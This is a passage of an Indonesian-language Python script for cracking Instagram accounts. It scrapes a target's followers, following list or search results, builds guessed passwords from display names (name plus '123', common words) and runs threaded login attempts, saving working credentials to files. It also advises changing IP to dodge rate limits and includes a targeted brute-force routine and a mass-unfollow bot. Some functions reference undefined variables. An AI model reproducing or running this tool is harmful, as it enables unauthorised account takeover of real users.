ive_see_fewer_videos_like_this_universe,ig_android_show_new_contact_import_dialog,ig_android_live_view_profile_from_comments_universe,ig_fbns_blocked,ig_formats_and_feedbacks_holdout_universe,ig_android_reduce_view_pager_buffer,ig_android_instavideo_periodic_notif,ig_search_user_auto_complete_cache_sync_ttl,ig_android_marauder_update_frequency,ig_android_suggest_password_reset_on_oneclick_login,ig_android_promotion_entry_from_ads_manager_universe,ig_android_live_special_codec_size_list,ig_android_enable_share_to_messenger,ig_android_background_main_feed_fetch,ig_android_live_video_reactions_creation_universe,ig_android_channels_home,ig_android_sidecar_gallery_universe,ig_android_upload_reliability_universe,ig_migrate_mediav2_universe,ig_android_insta_video_broadcaster_infra_perf,ig_android_business_conversion_social_context,android_ig_fbns_kill_switch,ig_android_live_webrtc_livewith_consumption,ig_android_destroy_swipe_fragment,ig_android_react_native_universe_kill_switch,ig_android_stories_book_universe,ig_android_all_videoplayback_persisting_sound,ig_android_draw_eraser_universe,ig_direct_search_new_bootstrap_holdout_universe,ig_android_cache_layer_bytes_threshold,ig_android_search_hash_tag_and_username_universe,ig_android_business_promotion,ig_android_direct_search_recipients_controller_universe,ig_android_ad_show_full_name_universe,ig_android_anrwatchdog,ig_android_qp_kill_switch,ig_android_2fac,ig_direct_bypass_group_size_limit_universe,ig_android_promote_simplified_flow,ig_android_share_to_whatsapp,ig_android_hide_bottom_nav_bar_on_discover_people,ig_fbns_dump_ids,ig_android_hands_free_before_reverse,ig_android_skywalker_live_event_start_end,ig_android_live_join_comment_ui_change,ig_android_direct_search_story_recipients_universe,ig_android_direct_full_size_gallery_upload,ig_android_ad_browser_gesture_control,ig_channel_server_experiments,ig_android_video_cover_frame_from_original_as_fallback,ig_android_ad_watchinstall_universe,ig_android_ad_viewability_logging_universe,ig_android_new_optic,ig_android_direct_visual_replies,ig_android_stories_search_reel_mentions_universe,ig_android_threaded_comments_universe,ig_android_mark_reel_seen_on_Swipe_forward,ig_internal_ui_for_lazy_loaded_modules_experiment,ig_fbns_shared,ig_android_capture_slowmo_mode,ig_android_live_viewers_list_search_bar,ig_android_video_single_surface,ig_android_offline_reel_feed,ig_android_video_download_logging,ig_android_last_edits,ig_android_exoplayer_4142,ig_android_post_live_viewer_count_privacy_universe,ig_android_activity_feed_click_state,ig_android_snippets_haptic_feedback,ig_android_gl_drawing_marks_after_undo_backing,ig_android_mark_seen_state_on_viewed_impression,ig_android_live_backgrounded_reminder_universe,ig_android_live_hide_viewer_nux_universe,ig_android_live_monotonic_pts,ig_android_search_top_search_surface_universe,ig_android_user_detail_endpoint,ig_android_location_media_count_exp_ig,ig_android_comment_tweaks_universe,ig_android_ad_watchmore_entry_point_universe,ig_android_top_live_notification_universe,ig_android_add_to_last_post,ig_save_insights,ig_android_live_enhanced_end_screen_universe,ig_android_ad_add_counter_to_logging_event,ig_android_blue_token_conversion_universe,ig_android_exoplayer_settings,ig_android_progressive_jpeg,ig_android_offline_story_stickers,ig_android_gqls_typing_indicator,ig_android_chaining_button_tooltip,ig_android_video_prefetch_for_connectivity_type,ig_android_use_exo_cache_for_progressive,ig_android_samsung_app_badging,ig_android_ad_holdout_watchandmore_universe,ig_android_offline_commenting,ig_direct_stories_recipient_picker_button,ig_insights_feedback_channel_universe,ig_android_insta_video_abr_resize,ig_android_insta_video_sound_always_on'''
	SIG_KEY_VERSION = '4'

	def __init__(self,username,password):
		self.username=username
		self.password=password
		m = hashlib.md5()
		m.update(username.encode('utf-8') + password.encode('utf-8'))
		self.device_id = self.generateDeviceId(m.hexdigest())
		self.uuid = self.generateUUID(True)
		self.s = requests.Session()

	def generateDeviceId(self, seed):
		volatile_seed = "12345"
		m = hashlib.md5()
		m.update(seed.encode('utf-8') + volatile_seed.encode('utf-8'))
		return 'android-' + m.hexdigest()[:16]

	def generateUUID(self, type):
		generated_uuid = str(uuid.uuid4())
		if (type):
			return generated_uuid
		else:
			return generated_uuid.replace('-', '')

	def loginAPI(self):
		token=self.s.get("https://www.instagram.com/",headers={"user-agent":User_Agent()}).text
		crf_token=re.findall(r"\"csrf_token\"\:\"(.*?)\"", str(token))[0]
		self.s.headers.update({'Connection': 'close',
			'Accept': '*/*',
			'Content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
			'Cookie2': '$Version=1',
			'Accept-Language': 'en-US',
			'User-Agent': user_agentAPI()})
		self.data = json.dumps({
			'phone_id': self.generateUUID(True),
			'_csrftoken': crf_token,
			'username': self.username,
			'guid': self.uuid,
			'device_id': self.device_id,
			'password': self.password,
			'login_attempt_count': '0'})
		self.payload = 'signed_body={}.{}&ig_sig_key_version=4'.format(
			self.generateUUID(False),
			urllib.request.quote(self.data)
		)
		x=self.s.post("https://i.instagram.com/api/v1/accounts/login/", self.payload)
		x_jason=json.loads(x.text)
		x_kukis=x.cookies.get_dict()
		if "logged_in_user" in x.text:
			kuki=";".join([v+"="+x_kukis[v] for v in x_kukis])
			#id=x_jason['logged_in_user']['pk']
			#nm=x_jason['logged_in_user']['full_name']
			#pn=x_jason['logged_in_user']['phone_number']
			return {'status':'success','cookie':kuki,'userame':self.username}
		elif 'challenge_required' in x.text:
			return {'status':'checkpoint'}
		else:
			return {'status':'login_error'}
C = ''
class instagram:
	def __init__(self,external,username,cookie):
		self.ext=external
		self.username=username
		self.cookie=cookie
		self.s=requests.Session()

	def logo(self):
		os.system('clear')
		for i in external:
			try:
				nama=i.split('|')[0]
				followers=i.split('|')[1]
				following=i.split('|')[2]
			except:
				pass
		banner()
		print(f"""
{U}•{P} 01 {O}Crack dari pengikut
{U}•{P} 02 {O}Crack dari mengikuti
{U}•{P} 03 {O}Crack dari pencarian nama
{U}•{P} 04 {O}Crack secara target 
{U}•{P} 05 {O}Cek status akun hasil crack
{U}•{P} 06 {O}Bot auto unfollow
{U}•{P} rm {O}Hapus akun
{U}•{M} 00 {O}Keluar
	""")
	
	def menu(self):
		self.logo()
		c=input('%s# %sPilih %s> %s'%(P,O,M,K))
		if c=='':
			print ('\n%s%s isi yang benar'%(M,til));jeda(2)
			self.menu()
		elif c in ('1','01'):
			print ("\n%s%s %sPerlu di ingat target harus bersifat publik "%(U,til,O))
			m=input('%s%s %sUsername target%s > %s'%(U,til,O,M,K))
			id=self.idAPI(self.cookie,m)
			info=self.infoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/followers/?count=100000',id)
			self.passwordAPI(info)
		elif c in ('2','02'):
			print ("\n%s%s %sPerlu di ingat target harus bersifat publik "%(U,til,O))
			m=input('%s%s %sUsername target%s > %s'%(U,til,O,M,K))
			id=self.idAPI(self.cookie,m)
			info=self.infoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/following/?count=100000',id)
			self.passwordAPI(info)
		elif c in ('3','03'):
			print ("\n%s%s %sSemakin banyak target semakin banyak id yg terkumpul "%(U,til,O))
			m=int(input('%s%s %sJumlah target%s > %s'%(U,til,O,M,K)))
			print('')
			for i in range(m):
				i+=1
				nama=input('%s•%s %s %sMasukan nama%s > %s'%(U,P,i,O,M,K))
				name=self.searchAPI(self.cookie,nama)
			print ('')
			self.passwordAPI(name)
		elif c in ('4','04'):
			crack_target()
			exit()
		elif c in ('5','05'):
			print('')
			for i in os.listdir('IG'):
				print("%s•%s> %s%s"%(U,M,J,i));jeda(0.07)
			c=input("\n%s•%s masukan file %s:%s "%(U,O,M,K))
			g=open("IG/%s"%(c)).read().splitlines()
			print(" %s# %s---------------------------------------- %s#"%(P,M,P));jeda(2)
			print('%s%s%s Total akun %s: %s%s '%(U,til,O,M,H,len(g)))
			print(" %s# %s---------------------------------------- %s#%s"%(P,M,P,K));jeda(2)
			print("\n%s•%s Mohon tunggu sedang mengecek akun ... "%(U,O))
			for s in g:
				usr=s.split("|")[0]
				pwd=s.split("|")[1]
				self.checkAPI(usr,pwd)
			exit("\n%s%s%s Selesai mengecek akun"%(U,til,O));jeda(0.07)
		elif c in ('6','06'):
			global following
			six=0
			print ("\n%s%s %sBot unfollow-All di jalankan "%(U,til,O))
			x=open('.kukis.log','r').read()
			x_id=re.findall('sessionid=(\d+)',x)[0]
			back=self.infoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/following/?count=100000',x_id)
			for i in following:
				six+=1
				sleep(float( random.uniform(nyMnD*10,nyMxD*10) / 10 ))
				six_id=self.sixAPI(i)
				print (f"{U}{til}{O} {str(six)} {i} {H}Unfollow berhasil √")
				self.unfollowAPI(six_id,'5452333948',self.cookie)
				#print(w)
			exit(f'\n {H}√ unfollow selesai ...')
			self.menu()
		elif c in ('rm','RM','Rm'):
			os.remove('.kukis.log')
			os.remove('.username')
			jalan ("\n%s%s berhasil menghapus data login "%(M,til))
			exit()
		elif c in ('0','00'):
			exit()
		else:
			print ('\n%s%s isi yang benar'%(M,til));jeda(2)
			self.menu()

	def sixAPI(self,six_id):
		url = "https://www.instagram.com/web/search/topsearch/?context=blended&query="+six_id+"&rank_token=0.3953592318270893&count=1"
		x = requests.get(url)
		x_jason = x.json()
		uid = str( x_jason['users'][0].get("user").get("pk") )
		return uid

	def unfollowAPI(self,user_id,username_id,cookie):
		uuid=generateUUID(True)
		xx=self.s.get("https://www.instagram.com/",headers={"user-agent":User_Agent()}).content
		crf_token = re.findall('{"config":{"csrf_token":"(.*)","viewer"',str(xx))[0]
		s.headers.update({'Connection': 'close',
                       'Accept': '*/*',
                       'Content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                       'Cookie2': '$Version=1',
                       'Accept-Language': 'en-US',
                       'User-Agent': User_Agent()})
		data = json.dumps({'_uuid': uuid,
                           '_uid': username_id,
                           'user_id': user_id,
                           '_csrftoken': crf_token})
		self.payload = 'signed_body={}.{}&ig_sig_key_version=4'.format(
			self.generateUUID(False),
			urllib.request.quote(data))
		return s.post('https://i.instagram.com/api/v1/friendships/destroy/%s/'%(user_id),self.payload,cookies=cookie).text

	def searchAPI(self,cookie,nama):
		try:
			x=s.get('https://www.instagram.com/web/search/topsearch/?count=100000&context=blended&query=%s&rank_token=0.21663777590422106&include_reel=true'%(nama),cookies=cookie,headers={"user-agent":USN})
			x_jason=json.loads(x.text)
			for i in x_jason['users']:
				user=i['user']
				username=user['username']
				fullname=user['full_name']
				internal.append(f'{username}|{fullname}')
		except requests.exceptions.ConnectionError:
			exit('\n%s%s tidak ada koneksi%s\n'%(M,til,N))
		return internal

	def idAPI(self,cookie,id):
		try:
			m=s.get('https://www.instagram.com/%s/?__a=1'%(id),cookies=cookie,headers={"user-agent":USN})
			m_jason=m.json()["graphql"]["user"]
			idx=m_jason["id"]
		except requests.exceptions.ConnectionError:
			exit('\n%s%s tidak ada koneksi%s\n'%(M,til,N))
		except Exception as e:
			exit('\n%s%s username yg anda masukan salah pastikan target bersifat publik%s\n'%(M,til,N))
		return idx

	def infoAPI(self,cookie,api,id):
		try:
			x=s.get(api%(id),cookies=cookie,headers={"user-agent":USN})
			x_jason=json.loads(x.text)
			for i in x_jason['users']:
				username = i["username"]
				nama = i["full_name"]
				internal.append(f'{username}|{nama}')
				following.append(username)
		except requests.exceptions.ConnectionError:
			exit('\n%s%s tidak ada koneksi%s\n'%(M,til,N))
		except Exception as e:
			exit('\n%s%s username yg anda masukan salah pastikan target bersifat publik%s\n'%(M,til,N))
		return internal

	def passwordAPI(self,xnx):
		print ("\r%s•%s Total user %s> %s%s"%(U,O,M,H,len(internal)))
		print(f"""
{U}{til}{O} [ {U}pilih methode crack, silahkan coba satu²{O} ]

{U}{til}{P} 01 {O}Methode {M}V.1 {O}(fast)
{U}{til}{P} 02 {O}Methode {P}V.2 {O}(slow)
{U}{til}{P} 03 {O}Methode {H}V.3 {O}(very slow)
		""")
		c=input('%s# %sPilih %s> %s'%(P,O,M,K))
		if c=='1':
			self.generateAPI(xnx,c)
		elif c=='2':
			self.generateAPI(xnx,c)
		elif c=='3':
			self.generateAPI(xnx,c)
		else:
			self.passwordAPI(xnx)

	def generateAPI(self,user,o):
		print(f"""
{U}{til}{O} [ {U}pilih user-agent, silahkan coba satu²{O} ]

{U}{til}{P} 01 {O}User-Agent 1
{U}{til}{P} 02 {O}User-Agent 2
{U}{til}{P} 03 {O}User-Agent 3
		""")
		ua=input('%s# %sPilih %s> %s'%(P,O,M,K))
		if ua=='1':
			uaAPI=User_Agent()
		elif ua=='2':
			uaAPI=user_agent()
		elif ua=='3':
			uaAPI=user_agentAPI()
		print(f"""
{U}{til}{O} akun {H}[OK] {O}tersimpan ke file {M}> {H}IG/OK-{day}.txt
{U}{til}{O} akun {M}[{K}CP{M}] {O}tersimpan ke file {M}> {K}IG/CP-{day}.txt
{U}!{O} setiap crack 1k ID, mainkan mode pesawat 3 detik
		""")
		with ThreadPoolExecutor(max_workers=30) as shinkai:
			for i in user:
				try:
					username=i.split("|")[0]
					password=i.split("|")[1].lower()
					for w in password.split(" "):
						if len(w)<3:
							continue
						else:
							w=w.lower()
							if o=="1":
								if len(w)==3 or len(w)==4 or len(w)==5:
									sandi=[w+'123',w+'12345']
								else:
									sandi=[w+'123',w+'12345']
							elif o=="2":
								if len(w)==3 or len(w)==4 or len(w)==5:
									sandi=[w,w+'123',w+'12345']
								else:
									sandi=[w,w+'123',w+'12345']
							elif o=="3":
								if len(w)==3 or len(w)==4 or len(w)==5:
									sandi=[w,w+'123',w+'12345',w,password.lower()]
								else:
									sandi=[w,w+'123',w+'12345',w,password.lower()]
							shinkai.submit(self.crackAPI,username,sandi,uaAPI)
				except:
					pass
		
		#os.popen('play-audio data/selesai.mp3')
		exit("\n%s√ finished"%(H))

	def APIinfo(self,user):
		try:
			x=s.get("https://www.instagram.com/%s/?__a=1"%(user),headers={"user-agent":USN})
			x_jason=x.json()["graphql"]["user"]
			nama=x_jason["full_name"]
			pengikut=x_jason["edge_followed_by"]["count"]
			mengikut=x_jason["edge_follow"]["count"]
			postingan=x_jason["edge_owner_to_timeline_media"]["count"]
		except:
			pass
		return nama,pengikut,mengikut,postingan

	def crackAPI(self,user,pas,uaAPI):
		global loop,success,checkpoint
		warna = random.choice([M, H, K, B, U, O, P, J])
		sys.stdout.write('\r'+warna+'•\x1b[1;96m [crack] %s/%s [%sOK%s:%s%s%s]-[%sCP%s:%s%s%s]    '%(loop,len(internal),H,M,H,len(success),O,K,M,K,len(checkpoint),O)),
		sys.stdout.flush()
		try:
			for pw in pas:
				token=s.get('https://www.instagram.com/accounts/login/')
				headers = {
					'Host': 'www.instagram.com',
					'User-Agent': uaAPI,
					'Accept': '/',
					'Accept-Language': 'id,en-US;q=0.7,en;q=0.3',
					'Accept-Encoding': 'gzip, deflate, br',
					'X-CSRFToken': token.cookies['csrftoken'],
					'X-Instagram-AJAX': '1d6caaf37cd2',
					'X-IG-App-ID': '936619743392459',
					'X-ASBD-ID': '437806',
					'X-IG-WWW-Claim': '0',
					'Content-Type': 'application/x-www-form-urlencoded',
					'X-Requested-With': 'XMLHttpRequest',
					'Content-Length': '347',
					'Origin': 'https://www.instagram.com',
					'Connection': 'keep-alive',
					'Referer': 'https://www.instagram.com/accounts/login/'
				}
				param={
                    "username": user,
					"enc_password": "#PWD_INSTAGRAM_BROWSER:0:{}:{}".format(random.randint(1000000000, 99999999999),pw),
					"optIntoOneTap": False,
					"queryParams": {},
					"stopDeletionNonce": "",
					"trustedDeviceRecords": {}}
				x=s.post("https://www.instagram.com/accounts/login/ajax/",headers=headers,data=param)
				x_jason=json.loads(x.text)
				if "userId" in str(x_jason):
					nama,pengikut,mengikut,postingan=self.APIinfo(user)
					print(f"""\r{J}╔══[ {H}Berhasil                      
{J}║══[{H} Nama akun {M}> {H}{nama}
{J}║══[{H} Username  {M}> {H}{user}
{J}║══[{H} Password  {M}> {H}{pw}
{J}║══[{H} Followers {M}> {H}{pengikut}
{J}╚══[{H} Following {M}> {H}{mengikut}
					""")
					#os.popen("play-audio dapet.mp3")
					open(f"IG/OK-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
					success.append(user)
					break
				elif 'checkpoint_url' in str(x_jason):
					nama,pengikut,mengikut,postingan=self.APIinfo(user)
					print(f"""\r{J}╔══[ {K}Checkpoint                      
{J}║══[{K} Nama akun {M}> {K}{nama}
{J}║══[{K} Username  {M}> {K}{user}
{J}║══[{K} Password  {M}> {K}{pw}
{J}║══[{K} Followers {M}> {K}{pengikut}
{J}╚══[{K} Following {M}> {K}{mengikut}
					""")
					#os.popen("play-audio dapet.mp3")
					open(f"IG/CP-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
					checkpoint.append(user)
					break
				elif 'Harap tunggu beberapa menit sebelum mencoba lagi.' in str(x.text):
					sys.stdout.write(f"\r{M} ! terkena spam, aktifkan mode pesawat ");sys.stdout.flush();sleep(10)
					self.crackAPI(user,pas,uaAPI)
				else:
					continue
			loop+=1
		except:
			self.crackAPI(user,pas,uaAPI)

	def checkAPI(self,user,pw):
		try:
			token=s.get("https://www.instagram.com/",headers={"user-agent":User_Agent()}).content
			crf_token=re.findall(r"\"csrf_token\"\:\"(.*?)\"", str(token))[0]
			s.headers.update({
				'authority': 'www.instagram.com',
				'x-ig-www-claim': 'hmac.AR08hbh0m_VdJjwWvyLFMaNo77YXgvW_0JtSSKgaLgDdUu9h',
				'x-instagram-ajax': '82a581bb9399',
				'content-type': 'application/x-www-form-urlencoded',
				'accept': '*/*',
				'user-agent': user_agent(),
				'x-requested-with': 'XMLHttpRequest',
				'x-csrftoken': crf_token,
				'x-ig-app-id': '936619743392459',
				'origin': 'https://www.instagram.com',
				'sec-fetch-site': 'same-origin',
				'sec-fetch-mode': 'cors',
				'sec-fetch-dest': 'empty',
				'referer': 'https://www.instagram.com/',
				'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8'
			})
			param={
				"username": user,
				"enc_password": "#PWD_INSTAGRAM_BROWSER:0:{}:{}".format(random.randint(1000000000, 99999999999),pw),
				"optIntoOneTap": False,
				"queryParams": {},
				"stopDeletionNonce": "",
				"trustedDeviceRecords": {}
			}
			x=s.post("https://www.instagram.com/accounts/login/ajax/",data=param);sleep(1)
			x_jason=json.loads(x.text)
			if "userId" in x.text:
				nama,pengikut,mengikut,postingan=self.APIinfo(user)
				print(f"""\r   
{J}╔══[ {H}Berhasil                      
{J}║══[{H} Nama akun {M}> {H}{nama}
{J}║══[{H} Username  {M}> {H}{user}
{J}║══[{H} Password  {M}> {H}{pw}
{J}║══[{H} Followers  {M}> {H}{pengikut}
{J}║══[{H} Following  {M}> {H}{mengikut}
{J}╚══[{H} Postingan  {M}> {H}{postingan}
				""")
				#os.popen("play-audio dapet.mp3")
			elif 'checkpoint_url' in x.text:
				nama,pengikut,mengikut,postingan=self.APIinfo(user)
				print(f"""\r  
{J}╔══[ {K}Checkpoint                      
{J}║══[{K} Nama akun {M}> {K}{nama}
{J}║══[{K} Username  {M}> {K}{user}
{J}║══[{K} Password  {M}> {K}{pw}
{J}║══[{K} Followers  {M}> {K}{pengikut}
{J}║══[{K} Following  {M}> {K}{mengikut}
{J}╚══[{K} Postingan  {M}> {K}{postingan}
				""")
			elif 'Please wait a few minutes' in str(x.text):
				sys.stdout.write(f"\r{M} ! terkena spam, aktifkan mode pesawat ");sys.stdout.flush();sleep(10)
				self.checkAPI(user,pw)
		except:
			self.checkAPI(user,pw)
			
looping=1
def infohhh(username_dev, pass_dev, status):
	try:
		global id_, pengikut, mengikuti, nama
		da = requests.get("https://www.instagram.com/%s/?__a=1"%(user),headers={"user-agent":USN})
		data_us_dev = da.json()["graphql"]["user"]
		nama = data_us_dev["full_name"].encode("utf-8")
		id_ = data_us_dev["id"]
		pengikut = data_us_dev["edge_followed_by"]["count"]
		mengikuti = data_us_dev["edge_follow"]["count"]
	except requests.exceptions.ConnectionError:
		if status == "":
			exit("\n%s• Tidak ada koneksi internet \n"%(M))
		else:
			print ("\r%s• %s : %s > %s             \n"%(M,status,username_dev,pass_dev))
			pass
	except ValueError:
		if status == "":
			exit("\n%s• IP anda terkena spam, mode pesawat 3 detik \n"%(M))
		else:
			print ("\r%s• %s : %s > %s             \n"%(M,status,username_dev,pass_dev))
			pass
	except:
		print ("\r%s• %s : %s > %s             \n"%(M,status,username_dev,pass_dev))
		pass
		
# CRACK TARGET
def crack_target():
	pw_none = ""
	status_none = ""
	word_list = []
	word_list_crack = []
	user_target = input('\n%s%s %sUsername target%s > %s'%(U,til,O,M,K))
	time.sleep(2)
	jalan ("%s%s%s Mohon tunggu ... "%(M,til,O))
	infohhh(user_target, pw_none, status_none)
	nama_pecah = nama.split()
	angka = [123,1234,12345]
	word_list.append(nama.replace(" ", ""))
	word_list.append(nama)
	for dev in angka:
		if len(nama_pecah) >= 2:
			word_list.append(nama.replace(" ", "")+str(dev))
		if len(nama_pecah) >= 1:
			for sub_dev in nama_pecah:
				word_list.append(sub_dev)
				word_list.append(sub_dev+str(dev))
		if len(nama_pecah) >= 2:
			word_list.append(nama_pecah[0]+nama_pecah[1])
			for dev_ in angka:
				word_list.append(nama_pecah[0]+nama_pecah[1]+str(dev_))
			word_list.append(nama_pecah[1]+nama_pecah[0])
			for dev_ in angka:
				word_list.append(nama_pecah[1]+nama_pecah[0]+str(dev_))
	word_list.append(user_target)
	for iq in set(word_list):
		if len(iq) >= 6:
			word_list_crack.append(iq)
	pw_tambahan = ["sayang", "iloveyou", "bismillah", "anjing", "bangsat", "bajingan", "rahasia", "katasandi", "password", "kontol", "123456","12345678", "123456789"]
	for f in pw_tambahan:
		word_list_crack.append(f)
	print ("%s%s%s berhasil membuat kata sandi "%(U,til,O));jeda(2)
	print 
	brute(user_target, word_list_crack)
	exit()
	
def brute(email_dev, san_dev_):
	for san_dev_1 in san_dev_:
		try:
			global looping
			san_dev = san_dev_1.lower()
			with requests.Session() as dev:
				pas = q[0]
				url_scrap = "https://www.instagram.com/"
				user_agentz_api = "Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)"
				headerz = {"User-Agent": user_agentz_api}
				data = dev.get(url_scrap+post_, headers=headerz).content
				crf_token = re.findall('{"config":{"csrf_token":"(.*)","viewer"', str(data))[0]
				header = {"Accept": "*/*","Accept-Encoding": "gzip, deflate, br","Accept-Language": "en-US,en;q=0.5","Host": "www.instagram.com","X-CSRFToken": crf_token,"X-Requested-With": "XMLHttpRequest","Referer": "https://www.instagram.com/accounts/login/","User-Agent": user_agentz,}
				param = {"username": email_dev,"enc_password": "#PWD_INSTAGRAM_BROWSER:0:{}:{}{}".format(random.randint(1000000000, 99999999999), san_dev,y),"optIntoOneTap": False,"queryParams": {},"stopDeletionNonce": "","trustedDeviceRecords": {}}
			print (P+" "+str(c)+"."+O+" password"+M+" > "+K+san_dev+"                ")
			with requests.Session() as ses_dev:
				url = "https://www.instagram.com/accounts/login/ajax/"
				respon = ses_dev.post(url+post_+y, data=param, headers=header)
				data_dev = json.loads(respon.content)
				l = q.replace(q, "")
				if "checkpoint_url" in str(data_dev):
					print (f"""{J}╔══[ {K}Checkpoint                      
{J}║══[{K} Nama akun {M}> {K}{nama}
{J}║══[{K} Username  {M}> {K}{email_dev}
{J}║══[{K} Password  {M}> {K}{san_dev}
{J}║══[{K} Followers  {M}> {K}{str(pengikut)}
{J}╚══[{K} Following  {M}> {K}{str(mengikuti)}
					""")
					break
				elif "userId" in str(data_dev):
					print (f"""{J}╔══[ {H}Berhasil                      
{J}║══[{H} Nama akun {M}> {H}{nama}
{J}║══[{H} Username  {M}> {H}{email_dev}
{J}║══[{H} Password  {M}> {H}{san_dev}
{J}║══[{H} Followers  {M}> {H}{str(pengikut)}
{J}╚══[{H} Following  {M}> {H}{str(mengikuti)}
					""")
					break
				elif "Please wait" in str(data_dev):					
					print ("\r%s! Mode pesawatkan 2 detik  "%(M))
					san_dev_split = san_dev.split()
					brute(email_dev, san_dev_split)
				else:
					pass
					looping+=1
		except requests.exceptions.ConnectionError:
			san_dev_split = san_dev.split()
			brute(email_dev, san_dev_split)
		except KeyboardInterrupt:
			exit("%s• Keluar...."%(M))
		except:
			pass


if __name__=="__main__":
	Masuk()
